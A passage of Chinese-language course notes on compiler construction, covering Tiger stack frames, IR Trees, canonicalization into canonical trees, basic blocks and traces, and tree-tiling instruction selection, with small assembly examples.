调用其他函数时传递的参数</li><li>static link: 如上所述</li><li>FP&#x2F;SP: 指向基址&#x2F;栈顶</li></ul><h3 id="Tiger语言编译器的栈帧实现"><a href="#Tiger语言编译器的栈帧实现" class="headerlink" title="Tiger语言编译器的栈帧实现"></a>Tiger语言编译器的栈帧实现</h3><p><del>看起来就不是什么会详细考的部分</del></p><p>formals &#x3D; formal-parameters (不包括static link之类隐藏的参数)</p><ul><li>记录变量在寄存器中还是在栈帧中</li><li>记录变量是否逃逸(escape)</li><li>…</li></ul><p>进入被调用函数的上下文&#x3D;新的栈帧&#x3D;“视角切换(view shift)”, 这是不同机器&#x2F;指令集的实现需要完成的。<br><img src="/compiler-construction-principles/view-shift.png" alt="view-shift" loading="lazy"></p><blockquote><p>💡本质上，我们在做的事和Lab3里为每一个参数分配地址，把一切读写放在内存里是一样的。<br>只是为了效率，有时这个“地址”并不存在而是储存在寄存器中；此外有的变量会逃逸。<br>因此需要实现访问的接口，对在寄存器的变量或者会逃逸的变量进行一些额外处理。</p></blockquote><p>其他trivial话题：</p><ul><li>Temporary: 局部变量的抽象名，代表一些暂存在寄存器中的值<ul><li>本质上是为不同scope里的相同变量名进行重命名，类似我们在lambda演算时做的重命名等价变换： $ \lambda x.x \equiv \lambda y.y$ 所以 $\lambda x.\lambda x.x \equiv \lambda x.\lambda y.y$, 然后才能无歧义地带入x, y</li></ul></li><li>Label: 标记还不能确定的机器静态的、物理的地址</li></ul><h3 id="总结：两层抽象"><a href="#总结：两层抽象" class="headerlink" title="总结：两层抽象"></a>总结：两层抽象</h3><p><img src="/compiler-construction-principles/two-layers.png" alt="2 layers: abstraction" loading="lazy"></p><ul><li><code>frame.h</code> <code>temp.h</code> 封装了<strong>机器无关</strong>的变量视角，我们无需关心是在内存还是在寄存器中</li><li><code>Translate</code>模块用于在上述封装的基础上将高级语言翻译为有层次的、用static link连接起来的各个函数，维护函数间的层次关系；找到跨层次的、对外部变量的访问，并把每个访问定位到具体某一层函数的某一个变量上。<ul><li>这里，我们让Static link这一指针“伪装”成一个传给嵌套函数的参数</li></ul></li></ul><h2 id="Part-13-中间表示-IR"><a href="#Part-13-中间表示-IR" class="headerlink" title="Part 13: 中间表示(IR)"></a>Part 13: 中间表示(IR)</h2><p><a name="intermediate-representation"></a></p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>IR &#x3D; Intermediate Representation</p><p>编译流程划分：</p><ul><li>前端：源代码-&gt;词法分析-&gt;语法分析-&gt;语义分析-&gt;</li><li>中端：IR1-&gt;IR2-&gt;…-&gt;IRn-&gt;<ul><li>这个过程可做一些机器无关优化（比如循环展开）</li></ul></li><li>后端：指令选择-&gt;寄存器分配-&gt;指令调度-&gt;机器码<ul><li>这个过程可做一些机器相关优化</li></ul></li></ul><h3 id="为何需要IR"><a href="#为何需要IR" class="headerlink" title="为何需要IR"></a>为何需要IR</h3><ul><li>更模块化，更可迁移（跨平台）<ul><li>考虑n个语言和m种平台，如果没有IR则需要n*m个编译器；引入一个IR后先统一翻译成IR，则只需要n+m个编译器</li></ul></li><li>多层的：分层应用不同的分析和优化（i.e. 变换）<ul><li>例如GCC, LLVM, Rust…</li></ul></li><li>可能丢失少部分机器特定的细节，但不会损失太多</li></ul><p>一个好的IR应该简单，然后将复杂的AST翻译为IR代码，最后组合不同代码块。</p><h3 id="IR杂项"><a href="#IR杂项" class="headerlink" title="*IR杂项"></a>*IR杂项</h3><p><strong>不要求掌握。</strong></p><ol><li><p>IR分类：</p><ul><li>高层IR: 提供语言特性的检测（例如borrow checking）</li><li>中层IR</li><li>低层IR: 贴近目标语言，易于生成</li></ul></li><li><p>表示方式：</p><ul><li><strong>结构化</strong><ul><li>基于图（树、无环图……）</li></ul></li><li>线性Linear: 储存布局是线性的<ul><li>栈（虚拟）机、<strong>三地址码</strong>……</li></ul></li><li>混合Hybrid: 节点内线性，节点间图形化<ul><li>经常见到的控制流图(CFG)就是一种</li></ul></li></ul></li><li><p>三地址码：</p><ul><li>是一种线性的IR</li><li>格式：<code>x = y op z</code></li><li>每个指令至多一个算符<code>op</code>, 至多三个操作数（地址）<code>x</code> <code>y</code> <code>z</code></li><li>地址可以为：<ul><li>源程序中显式的变量名</li><li>常量、字面量</li><li>编译器生成的临时中间变量</li></ul></li><li>也可以记为一个四元组：<code>(op, x, y, z)</code> <code>(unary_op, x, y, _)</code> …</li></ul></li><li><p>*静态单赋值SSA:</p><p> Lab3实现过但<strong>不要求掌握</strong>。<br> SSA是特殊的三地址码：每个变量只能被赋值一次<br> 加速分析优化，被广泛应用（如LLVM）</p></li></ol><h3 id="Tiger语言的IR-Tree及其指令"><a href="#Tiger语言的IR-Tree及其指令" class="headerlink" title="Tiger语言的IR Tree及其指令"></a>Tiger语言的IR Tree及其指令</h3><p>许多现代语言采用多层IR: AST-&gt;IR1-&gt;IR2-&gt;…-&gt;IRk-&gt;机器码<br>Tiger只使用单个IR, 也就是IR Tree: AST-&gt;IR Tree-&gt;汇编-&gt;机器码</p><p>IR Tree是一种特殊的树形IR。指令列举如下：</p><p>表达式（有值，可能有副作用）：</p><table><thead><tr><th>Syntax</th><th>Description</th></tr></thead><tbody><tr><td><strong>CONST(i)</strong></td><td>The integer constant i</td></tr><tr><td><strong>NAME(n)</strong></td><td>The symbolic constant n (e.g. a label is a name representing a address)</td></tr><tr><td><strong>TEMP(t)</strong></td><td>Temporary t.</td></tr><tr><td><strong>BINOP(o, e1, e2)</strong></td><td>The application of binary operator o to operands e1, e2. The integer arithmetic operators are PLUS, MINUS, MUL, DIV; the integer bitwise logical operators are AND, OR, XOR; the integer logical shift operators are LSHIFT, RSHIFT; the integer arithmetic right-shift is ARSHIFT.</td></tr><tr><td><strong>MEM(e)</strong></td><td>The contents of wordSize bytes of memory starting at address e. <strong>When MEM is used as the left child of a MOVE, it means “store”, but anywhere else it means “fetch”.</strong></td></tr><tr><td><strong>CALL(f, l)</strong></td><td>A procedure call: the application of function f to argument list l.</td></tr><tr><td><strong>ESEQ(s, e)</strong></td><td>Statement s is evaluated for side effects, then e is evaluated for the result.</td></tr></tbody></table><p>语句（无值，有副作用）：</p><table><thead><tr><th>Syntax</th><th>Description</th></tr></thead><tbody><tr><td><strong>MOVE(TEMP t, e)</strong></td><td>Evaluate e and move it into temporary t.</td></tr><tr><td><strong>MOVE(MEM(e1) e2)</strong></td><td>Evaluate e1, yielding address a. THEN evaluate e2, and store the result into wordSize bytes of memory starting at a.</td></tr><tr><td><strong>EXP(e)</strong></td><td>Evaluate e and discard the result.</td></tr><tr><td><strong>JUMP(e, labs)</strong></td><td>Transfer control (jump) to address e. The destination e may be a literal label, as in NAME(lab), or it may be an address calculated by any other kind of expression.</td></tr><tr><td><strong>CJUMP(o, e1, e2, t, f)</strong></td><td>Evaluate e1, e2 in that order, yielding values a, b. Then compare a, b using the relational operator o. If the result is true, jump to t; otherwise jump to f.</td></tr><tr><td><strong>SEQ(s1, s2)</strong></td><td>The statement s1 followed by s2.</td></tr><tr><td><strong>LABEL(n)</strong></td><td>DEFINE the constant value of name n to be the current machine code address.</td></tr></tbody></table><p><strong>每个指令都对应IR Tree的一颗子树。指令为根，操作数为其子节点。</strong></p><p>在这种中间表示中，我们假定有无数个寄存器。</p><p><strong>重要指令：ESEQ(s, e)</strong>:</p><ol><li>首先，<code>s</code>被执行(evaluate), 可能带有副作用(side effect)</li><li>而后，<code>e</code>被执行作为指令的值</li></ol><p>例如，<code>ESEQ(a=5, a+5)</code>会返回值<code>10</code>, 同时副作用是<code>a</code>的值变为5</p><blockquote><p>❗副作用&#x3D;更新了内存单元或更改了寄存器的值</p></blockquote><h3 id="从AST生成IR-Tree"><a href="#从AST生成IR-Tree" class="headerlink" title="从AST生成IR Tree"></a>从AST生成IR Tree</h3><p><del>这部分看看就行</del></p><ol><li><p>总览<br>Tiger语言并不区分语句(statement)和表达式。<br>AST中的表达式(expression)可以分为：</p><ul><li>返回数值的，记为<code>Ex</code></li><li>不返回数值的，记为<code>Nx</code></li><li>返回布尔值：用于条件跳转，记为<code>Cx</code><br> 加上一些辅助函数<code>unEx</code> <code>unNx</code> <code>unCx</code>用于在不同类型之间转换。</li><li>例如<code>flag:= (a&gt;b | c&lt;d)</code>, 右侧是<code>Cx</code>没有返回值，要转换成<code>Ex</code><ul><li>表达式上下文不同，含义也不同，因此需要我们在这一步根据情况像这样进行转换</li><li>说到底，IR翻译是上下文有关问题，不便用CFG刻画</li></ul></li></ul></li><li><p>变量翻译</p><ul><li>普通变量<ul><li>相对FP的便宜是固定的。假设偏移量为<code>k</code>，则内存中变量的值为：<code>MEM(BINOP(PLUS,TEMP fp, CONST k))</code></li><li>注意，对于一些常见的操作（例如加法）有如下简写：<code>BINOP(PLUS, a, b) = +(a, b)</code></li><li>因此若变量<code>a</code>在内存中为<code>InFrame(k)</code>, 则<code>F_Exp(a,T_Temp(F_FP())</code>翻译为<code>MEM(BINOP(PLUS,TEMPFP,CONST(k)))</code></li><li>而如果变量<code>b</code>在寄存器中为<code>InReg(t_832)</code>, 则直接翻译为<code>TEMP(t_832)</code></li></ul></li><li>数组变量<ul><li>其实就是一种固定的指针，只是没法直接拷贝（这一点取决于具体语言有所不同，Pascal就可以）</li><li>Tiger语言提供<code>Record</code>类型，类似结构体。本质上还是指针，可以（浅）拷贝</li></ul></li></ul></li><li><p>左值与右值<br> 初略的理解：<br> 右值：可以出现在赋值语句右侧，不能出现在左侧<br> 左值：可以出现在赋值语句左侧和右侧</p><blockquote><p>🤭当然C++作为一门博大精深的语言把左值、右值、纯右值、将亡值的定义和用法给玩出花来了。左值和将亡值合称泛左值(generalized lvalue&#x3D;glvalue)，纯右值和将亡值合称右值(right value&#x3D;rvalue)。</p></blockquote><p> 左值&#x2F;右值各自又分为两种：</p><ul><li><strong>标量(scalar)</strong>: 只有一个元素（比如单个的变量名）</li><li><strong>结构化的(structured)</strong>: 例如C中的结构体和数组<ul><li>在这种情况下，从内存中取值的指令<code>MEM(addr)</code>要修改为<code>MEM(addr, size)</code></li><li>当然Tiger语言并不需要：因为在Tiger语言中所有变量和左值都是标量（Tiger的数组和record本质上只是指针）。</li></ul></li></ul></li><li><p>杂项</p></li></ol><p><strong>对于这部分内容，如果认真写过Lab3: 实现AST-&gt;IR的应该可以直接无视。</strong></p><ul><li><p>下标索引与field选择</p><ul><li>数组：考虑<code>a[i]</code>, 其实际地址为<code>(i-l)*s+a</code>, 其中a为基地址，s为元素大小，l为最小索引值（l取0时即为<code>i*s+a</code>）。</li><li>Record: <code>a.f</code>地址自然是<code>offset(f)+a</code>, 其中<code>offset(f)</code>代表该field在Record中的固定偏移量</li></ul></li><li><p>内存安全</p><p>内存漏洞普遍存在且危害大。<br>部分解决方法：</p><ul><li>插入额外的指令动态检查数组越界或空指针<ul><li>性能↓↓↓</li></ul></li><li>静态检查：例如borrow checker</li></ul></li><li><p>运算符与条件语句</p><p>二元运算符的翻译是显然的。<br>一元运算符可以由等效的二元运算符表达式代替：<code>-a</code> &#x3D; <code>0-a</code> …<br>条件表达式可以转写为条件跳转，同时还能实现短路功能。</p></li><li><p>If, While, For</p><p>通过多个LABEL和条件跳转完成。<br>结构：</p><ul><li>If(cond): <code>cjump(cond,:TRUE,:FALSE)</code> <code>:TRUE</code> <code>then</code> <code>:FALSE</code> <code>else</code></li><li>While(cond): <code>:TEST</code> <code>cjump(cond,...)</code> <code>body</code> <code>:DONE</code><ul><li>遇到break则跳转到<code>:DONE</code>, 遇到continue则跳转到<code>:TEST</code></li></ul></li><li>For(init;cond;each): 转写为While即可。不过要记得及时跳出循环，因此在开头和执行<code>each</code>前都要判断<code>cond</code>是否成立。</li></ul></li><li><p>函数调用</p><p>显然的。但是记得在参数列表开头加入static link:<br><code>CALL(NAME :LABEL_f,[SL, e1, e2, ..., en])</code></p></li><li><p>类型、变量与函数定义</p><ul><li>丢弃类型定义（毕竟只是别名）</li><li>确定变量相对函数frame的偏移</li><li>把变量初始化值转为赋值语句，插入初始化处</li><li>函数定义分为三部分：<ul><li>prologue:<ul><li>函数入口的LABEL标记</li><li>更改栈帧的FP&#x2F;SP以创建新栈帧</li><li>保存不逃逸的参数到可用寄存器</li><li>保存逃逸的参数到栈帧（包含Static link）</li><li>保存Callee-save的寄存器到栈帧（例如返回地址）</li></ul></li><li>body: 翻译的函数体</li><li>epiloge:<ul><li>保存返回值到寄存器（或栈上某地址）</li><li>从栈帧中恢复Callee-save的寄存器</li><li>回退到调用者的栈帧（更改FP&#x2F;SP）</li><li>Return指令</li><li>【可选】伪指令标记函数在此结束</li></ul></li></ul></li></ul></li><li><p>重定位</p><p>对于条件跳转或其他跳转指令的目的地址有可能在此时没法直接确定。例如C语言的编译单元是每个<code>.c</code> <code>.h</code>文件，并不知道其他文件存在，所以可能遇到如下情况：</p><ul><li>需要函数入口&#x2F;变量的绝对地址，但目前只知道相对地址</li><li>需要访问在外部定义的函数&#x2F;变量，但尚未进行链接</li></ul><p>如果都能直接通过偏移找到位置，那么就是 <strong>“位置无关代码(PIC)”</strong> 了。<br>我们维护一个表记录需要待确定、需要在之后被填入的地址在哪些位置，留待日后使用。<br>参考ELF的<a href="https://stackoverflow.com/questions/63672744/why-differentiate-rel-text-and-rel-data-section">.rel.text</a></p></li></ul><h2 id="Part-14-基本块与traces"><a href="#Part-14-基本块与traces" class="headerlink" title="Part 14: 基本块与traces"></a>Part 14: 基本块与traces</h2><p>轨迹 &#x3D; trace</p><p><em>注：这里的许多概念都是针对Tiger语言的，承接上文。</em><br>在将IR的AST翻译为机器码的过程中，不可避免地需要解决将“树形的”AST转换到“线性的”机器码这一问题。<br>例如：一个包含<code>ESEQ</code>子节点的<code>BINOP</code>树代表一个二元运算符表达式。但由于<code>ESEQ</code>有副作用，这个表达式的值取决于<code>ESEQ</code>先求值&#x2F;后求值，是存在歧义的。<br>解决方法：将IR Tree变换为 <strong>正规形式(canonical form)</strong> ，而内部存在很多 <strong>正规树(canonical tree)</strong> （详见下文）.</p><h3 id="正规形式Canonical-Form"><a href="#正规形式Canonical-Form" class="headerlink" title="正规形式Canonical Form"></a>正规形式Canonical Form</h3><p>就是某个事物（树&#x2F;代码）经过规范化后的形式。<br>例如经过 canonicalization 的树是一种 canonical form.</p><p>对比 IR Tree 与 canonical form:</p><ul><li>IR Tree:<ul><li>容易从源码AST生成</li><li>难以直接翻译为机器码</li></ul></li><li>Canonical form:<ul><li><code>SEQ</code>节点都在最右侧一路向下：<br><img src="/compiler-construction-principles/canonical-form.png" alt="canonical form" loading="lazy"></li><li>一个函数就是一个大<code>SEQ</code>序列：<code>SEQ(s1,s2,s3...)</code></li><li>可以直接生成机器码</li></ul></li></ul><p>IR Tree 的 canonicalization 需要如下三步：</p><ol><li>IR树被转化&#x2F;重写，或者说线性化为一些正规树。<br>线性化：消除<code>ESEQ</code>以及把<code>CALL</code>向上挪。最后把树中的<code>SEQ</code>删去，这棵树就会“破碎”成很多<strong>正规树</strong>。</li><li>正规树被组装成一些基本块(basic block), 内部不包含<code>LABEL</code>与跳转语句。<br>这句话很别扭，更人体工程学的说法应该是“<code>LABEL</code>和跳转语句把代码（或这些树）分割成了不同基本块。”</li><li>基本块被排序成一些<strong>trace</strong>, trace 中的<code>CJUMP</code>指令后紧跟着条件不成立需要跳转到的<code>false</code>标签。<br>这是因为在IR Tree中<code>CJUMP</code>条件为真&#x2F;假分别跳转至两个不同标签，但事实上机器码可以顺着执行下去(fall-through), 只有条件为真才需要跳转到远处，否则直接不跳转往下继续运行即可。</li></ol><p><strong>所以我们并没有真的“生成”一颗叫 canonical form 的树：</strong>我们生成的是等价的、接近机器语言、能用于后续指令选择的代码。<br>Canonical tree, canonical form 这两个概念有点乱，不过最主要的还是知道 canonical tree 的性质以及 canonicalization 的具体步骤（见下）。</p><h3 id="正规树Canonical-Tree"><a href="#正规树Canonical-Tree" class="headerlink" title="正规树Canonical Tree"></a>正规树Canonical Tree</h3><p>一种中间体，从 IR Tree 线性化而来。<br>不要太纠结这个概念本身。<em>正规树</em>，不过是因为要重排一些指令，不得不破碎原来的树为森林后，为这些树起的一个过于术语化的名字。</p><p>Canonical tree 的性质：</p><ul><li>根节点为 <strong>语句(statement)</strong> ，所以正规树就对应IR中的一个语句，也就是IR Tree中的一个子树。<ul><li>只不过这些额外约束，所以子树可能需要经过变换，结构会改变。</li></ul></li><li>其他所有节点都是<strong>表达式</strong>。</li><li>不存在<code>SEQ</code>或者<code>ESEQ</code>。<ul><li><code>SEQ</code>: 用于分割出这些canonical tree, 自然被删了不存在。</li><li><code>ESEQ</code>: 被变换成<code>SEQ</code>然后也被删了（详见下文）。</li></ul></li><li>每个<code>CALL</code>节点的父节点即为canonical tree的根节点，且只能为<code>EXP</code>或<code>MOVE</code>.<ul><li>事实上至多只能有一个<code>CALL</code>节点，因为我们规定<code>EXP</code>或<code>MOVE</code>只能包含一个<code>CALL</code>.<br>这是因为实现上返回值在指定寄存器里保存，如果有两个<code>CALL</code>就会导致覆写，需要引入新的临时寄存器保存值（详见下文）。</li></ul></li></ul><h3 id="Stage-1-线性化为正规树"><a href="#Stage-1-线性化为正规树" class="headerlink" title="Stage 1: 线性化为正规树"></a>Stage 1: 线性化为正规树</h3><p>线性化 &#x3D; linearization<br>如果没有特别限定，本部分的“树”指的就是IR Tree.</p><ol><li><p>消除<code>ESEQ</code><br> 首先要去除原先树中所有的ESEQ. 总的来说是不断向上“提升”<code>ESEQ</code>直到它可以转为<code>SEQ</code>.<br> 部分规则如下：</p><table><thead><tr><th>Expression</th><th>Transforms to</th></tr></thead><tbody><tr><td>ESEQ(s1, ESEQ(s2, e))</td><td>ESEQ(SEQ(s1, s2), e)</td></tr><tr><td>BINOP(op, ESEQ(s, e1), e2)</td><td>ESEQ(s, BINOP(op, e1, e2))</td></tr><tr><td>MEM(ESEQ(s, e1))</td><td>ESEQ(s, MEM(e1))</td></tr><tr><td>JUMP(ESEQ(s, e1))</td><td>SEQ(s, JUMP(e1))</td></tr><tr><td>CJUMP(op, ESEQ(s, e1), e2, l1, l2)</td><td>SEQ(s, CJUMP(op, e1, e2, l1, l2))</td></tr><tr><td>BINOP(op, e1, ESEQ(s, e2))</td><td>ESEQ(MOVE(TEMP t, e1), ESEQ(s, BINOP(op, TEMP t, e2)))</td></tr><tr><td>CJUMP(op, e1, ESEQ(s, e2), l1, l2)</td><td>SEQ(MOVE(TEMP t, e1), SEQ(s, CJUMP(op, TEMP t, e2, l1, l2)))</td></tr><tr><td>MOVE(ESEQ(s, e1), e2)</td><td>SEQ(s, MOVE(e1, e2))</td></tr><tr><td>CALL(f, a)</td><td>ESEQ(MOVE(TEMP t, CALL(f, a)), TEMP(t))</td></tr></tbody></table><p> 这些变换的成立性是容易验证的，<br> 在这之中，要注意副作用的问题，也就是语句执行顺序对结果有影响的情况：例如对于<code>BINOP(op, e1, ESEQ(s, e2))</code>（<code>e1</code>先求值，而后执行<code>s</code>）：</p><ul><li>如果<code>s</code>会影响<code>e1</code>的值，那么不能调换二者的执行顺序。</li><li>也就是说<strong>不一定能</strong>变形为<code>ESEQ(s, BINOP(op, e1, e2))</code>（<code>s</code>先执行，而后对<code>e1</code>求值）</li><li>解决方法：使用临时变量保存<code>e1</code>值。这种情况下则变形为<code>ESEQ(MOVE(TEMP t,e1), ESEQ(s, BINOP(op, TEMP t, e2)))</code></li></ul><p> 可见，取决于<code>s</code>是否会影响<code>e1</code>值，有不同的变形策略。<br> 事实上，“会不会影响取值”是一种称为“可交换性(commutativity)”的属性：</p><ul><li>如果<code>s</code><strong>不</strong>影响<code>e1</code>值，那么我们说<code>s</code>, <code>e1</code> commute</li><li>如果<code>s</code><strong>会</strong>影响<code>e1</code>值，那么我们说<code>s</code>, <code>e1</code> do NOT commute</li></ul><p> 如果能判断两者是否commute, 就可以最大限度避免引入新的临时变量，使得目标代码尽可能短小、高效。遗憾的是由于内存读写等原因，这一判定问题是困难的。不过我们只需要进行保守近似即可。也就是说，如果我们的保守近似策略判定二者commute, 那么他们一定commute; 否则如果策略无法确信二者commute, 则保守地认为他们互相有可能影响（不commute）。</p><p> 一种年轻，简单，有时幼稚(naïve)的策略是：</p><ul><li>常量和所有语句commute</li><li>空语句和所有语句commute</li><li>其他情况均假定为not commute</li></ul><p> 当然，如果能进行别名分析(alias analyses)以判断某个内存地址是否会被两个不同指针指向, 就能确认更多的对象间commute, 得到更精确的近似。</p></li><li><p>移动<code>CALL</code>到顶层<br> 常见的现代编译器都使用指定寄存器保存函数返回值。因此形如<code>BINOP(PLUS, CALL(…), CALL(…))</code>有多个<code>CALL</code>子节点的表达式虽然结构正确，但在实现中存在对该寄存器的使用冲突。<br> 解决方法也很简单：对于多余的<code>CALL(fun, args)</code>直接转化为<code>ESEQ(MOVE(TEMP t, CALL(fun, args)), TEMP t)</code>, 也就是使用临时变量保存返回值。</p></li><li><p>重排并消除<code>SEQ</code><br> 在执行完上述步骤后，整个树可能形如<code>SEQ(SEQ(SEQ(..., sx), sy), sz)</code>.<br> 现在需要把<code>SEQ</code>变为父节点的最右儿子（类似平衡树的旋转）。这只需要无脑应用<code>SEQ(SEQ(a, b), c)</code> &#x3D;&gt; <code>SEQ(a, seq(b, c))</code>即可。<br> 然后树就变成了：<code>SEQ(s1, SEQ(s2, ..., SEQ(sn-1,sn)...))</code>（也就是让<code>SEQ</code>集中在树的“右上”部分）<br> <img src="/compiler-construction-principles/seq.png" alt="seq" loading="lazy"></p><p> 接下来把<code>SEQ</code>全部去除，只留下这些<code>s1</code> … <code>sn</code>: 每个都是一颗不含<code>SEQ</code>&#x2F;<code>ESEQ</code>的<strong>正规树</strong>！<br> 至此第一阶段任务完成。</p></li></ol><h3 id="Stage-2-3-处理条件跳转"><a href="#Stage-2-3-处理条件跳转" class="headerlink" title="Stage 2&amp;3: 处理条件跳转"></a>Stage 2&amp;3: 处理条件跳转</h3><p>大部分机器不具备<code>CJUMP</code>的两个分支跳转到两个不同块这种功能。通常来讲是一个分支是继续顺序向下执行，另一个分支进行跳转。<br>因此需要重排树，让<code>CJUMP</code>后紧接的就是一个label, 对应其中一个分支跳转到的块。<br>这需要以下两步：</p><ol><li><p>Stage 2: 组装为基本块(basic block)<br> 基本块指的是一串代码，进入则一路执行到块末尾。性质：</p><ul><li>开头是一个 label 伪指令（<strong>入口唯一！</strong>）</li><li>最后一个指令是跳转、条件跳转或返回等terminator</li><li>中间不包含其他 label&#x2F;terminator （<strong>出口唯一！</strong>）</li></ul><p> 本质上，如果没有跳转指令，程序只会一路向下执行。<br> 正是跳转指令（JUMP&#x2F;CJUMP&#x2F;RET&#x2F;…）令程序在执行中途跳出，而跳转的目标地址（也就是LABEL）令程序在执行中途跳入，才把原本的代码分割为了多个基本块。<br> 控制流图(Control-Flow Graph &#x3D; CFG)中的节点就是基本块，边就是跳转指令。<del>打开IDA反编译立刻就能见到。</del><br> <img src="/compiler-construction-principles/cfg.png" alt="CFG" loading="lazy"><br> 生成的过程是显然的：找到一个<code>LABEL</code>就新起一块；找到一个<code>JUMP</code>&#x2F;<code>CJUMP</code>&#x2F;<code>RET</code>&#x2F;…就结束当前块并新起一块。有的块缺少<code>LABEL</code>或者terminator则补上一个。</p></li><li><p>Stage 3: 生成轨迹(trace)<br> 基本块如何排列并不影响程序执行结果。<br> 然而我们需要进行一些优化，尽可能减少跳转或提高跳转的效率。例如：</p><ul><li>对于<code>CJUMP(cond, true, false)</code>, 将false label对应的块紧挨着放置在<code>CJUMP</code>指令后，这样执行时就可以fall through</li><li>尝试将无条件跳转<code>JUMP</code>的目标label对应的块直接放在<code>JUMP</code>后</li><li>如果可以，甚至可以直接删除部分<code>JUMP</code>, 例如将函数内联</li><li>优化缓存命中率:<br><img src="/compiler-construction-principles/block-ordering.png" alt="block ordering" loading="lazy"></li><li>…</li></ul><p> 在此定义几个相关概念:</p><ul><li><strong>轨迹trace</strong><ul><li>一个可以被按顺序执行完毕的指令序列</li><li>说人话：几个连接在一起的基本块构成一个trace</li><li>CFG图中的一条链就是一个trace</li></ul></li><li><strong>covering set of traces</strong><ul><li>一个集合，元素是许多<strong>无环</strong>trace</li><li>每个基本块在且恰好在一个trace中（i.e. 集合能覆盖整个CFG图）</li></ul></li></ul><p> 有一个比较显然的构建方法：从源节点（不叫根节点是因为这只是个图，大概率不是棵树）开始跑一次DFS即可。<br> 每次从一个未被染色的节点开始，递归地对于每个后继节点，如果还未染色则加入当前trace。<br> 重复该过程直到整个图都被染色。<br> <img src="/compiler-construction-principles/covering-set.png" alt="coloring" loading="lazy"></p><p> 通过这种方式可以去掉不少跳转。<br> 这是因为现在可以转变思维：原先的跳转指令似乎毫无关联，而现在则是把其中一些连在一起成为traces，然后默认代码执行是在一个trace上走到底的。于是只有要切换trace时才需要一个跳转。<br> 可见，其实我们希望被经常执行的一段代码序列要自己成一个trace，这样就可以尽量减少跳转，增加性能。<br> 在某个判据(criteria)下最好的一些trace就可以被称为 <strong>“optimal traces”</strong> .<br> 例如如果我们的判据是“最少的跳转指令”，对于<code>While</code>语句，通过合理的重排就可以去掉一个跳转达成：<br> <img src="/compiler-construction-principles/optimal-traces.png" alt="to be optimal" loading="lazy"><br> <img src="/compiler-construction-principles/reorder-eg.png" alt="reorder example" loading="lazy"></p></li></ol><h3 id="IR-机器码：小结"><a href="#IR-机器码：小结" class="headerlink" title="IR-&gt;机器码：小结"></a>IR-&gt;机器码：小结</h3><p>一共四步：</p><ol><li>把IR Tree转成一些canonical trees</li><li>重排这些canonical trees为traces, 使得<code>CJUMP(cond, :true, :false)</code>后紧跟着<code>LABEL(:false)</code></li><li><strong>指令选择</strong>：从 canonical trees 产生伪汇编代码</li><li>对伪汇编代码进行<strong>寄存器分配</strong>：确定哪些值可以放置在寄存器中</li><li>指令调度（不在本课程中）：通过重排等操作优化代码、实现指令级并行</li></ol><p>其中后 3 步将在后文展开阐述。</p><h2 id="Part-15-指令选择"><a href="#Part-15-指令选择" class="headerlink" title="Part 15: 指令选择"></a>Part 15: 指令选择</h2><p>回顾<a href="#intermediate-representation">现代编译器架构</a>：<strong>指令选择</strong> 开始是编译器的后端部分。<br>LLVM支持用tblgen描述后端，从而自动生成指令选择器。</p><h3 id="指令选择概述"><a href="#指令选择概述" class="headerlink" title="指令选择概述"></a>指令选择概述</h3><p><strong>任务：</strong> 把IR转化为 <em>抽象汇编代码</em>。</p><p>抽象汇编代码&#x3D;</p><ul><li>具有有限个寄存器的汇编代码；</li><li>为中间结果创造新的临时寄存器；</li><li>在之后的流程中，会把这些寄存器映射到物理寄存器。</li></ul><p>指令选择要解决的问题：IR的一个语句有多种可能的实现方式，需要确定为其中“最好”的一种。<br>最好&#x3D; 最快&#x2F;最小&#x2F;最省电……这个判据取决于具体需求。总之需要综合考虑操作数&#x2F;结果的访存需求，指令本身的代价等。</p><p>例如对于<code>MOVE(TEMP(t1), TEMP(t1) + MEM(TEMP(FP)+4))</code>, 既可以翻译为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov t2, rbp</span><br><span class="line">add t2, 4</span><br><span class="line">mov r3, [t2]</span><br><span class="line">add t1, t3</span><br></pre></td></tr></table></figure><p>，也可以翻译为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add t1, [rbp + 4]</span><br></pre></td></tr></table></figure><p>指令选择一种可能的实现方式：<strong>对IR进行模式匹配，一个模式匹配一些IR片段，转化为机器指令</strong><br>IR Tree 是一种 <em>tree-oriented IR</em>, 自然需要在树上进行模式匹配。例如基于动态规划(DP)的匹配。<br>同理对于线性IR，就需要一些字符串匹配。例如纯文本匹配。<br>当然，匹配器(matcher)都是因地制宜相差甚远的，我们不需要当一个分类学家。</p><p>接下来把重心放在树形IR上。</p><h3 id="指令选择算法：基于树覆盖"><a href="#指令选择算法：基于树覆盖" class="headerlink" title="指令选择算法：基于树覆盖"></a>指令选择算法：基于树覆盖</h3><p>这里的覆盖意指：显然的，整棵 IR Tree 需要被完全覆盖才能完成翻译流程。<br>为了方便起见，接下来假设目标机器码是一个简单的架构（指令集）：<code>Jouette</code>架构。它基本上就是RISC-V的子集。我们约定：</p><ul><li>寄存器<code>r0</code>永远为0</li><li>数据&#x2F;地址能直接在寄存器中放得下</li><li>每时钟周期只有1个指令执行</li><li>每个指令延迟1时钟周期（<strong>但内存-内存数据拷贝使用的<code>MOVEM</code>指令除外</strong>）</li></ul><p>有如下翻译方式：</p><ul><li>宏展开&#x2F;模板匹配<ul><li>公式化地，把每条IR直接展开成一或多条机器指令</li><li>缺点：缺乏优化<ul><li>只能1-&gt;1或1-&gt;N, 但多条IR指令有时明明可以合并(N-&gt;1)</li><li>盲目的，缺乏上下关联</li></ul></li></ul></li><li>通过寻找树上的模式(tree patterns)<ul><li><strong>将在下文详细研究。</strong></li><li>Tree Pattern: IR Tree的某个片段如果长得符合某个树形的模式(tree pattern)，就可以把这部分对应到一条机器码。<ul><li>这种模式匹配出来的 IR Tree 片段被叫做 <strong>tile</strong>.</li><li>tile 是模式匹配到的一个实例。</li></ul></li><li>比如<code>LOAD ri &lt;- M[rj+c]</code>对应的模式就可以是<code>MEM(BINOP(PLUS, _expr_, CONST(_expr_)))</code></li><li>目标：没有重叠地覆盖整棵IR Tree. 这个过程称为<code>tiling</code></li><li>把机器码转为对应的 tree patterns (注意可能有多种模式都可以翻译到这种机器码)。以<code>Jouette</code>架构为例：<br><img src="/compiler-construction-principles/jouette-patterns.png" alt="jouette patterns" loading="lazy"><ul><li>接下来只需找到一种方式让各种机器指令的 tree pattern 能够覆盖整颗 IR Tree, 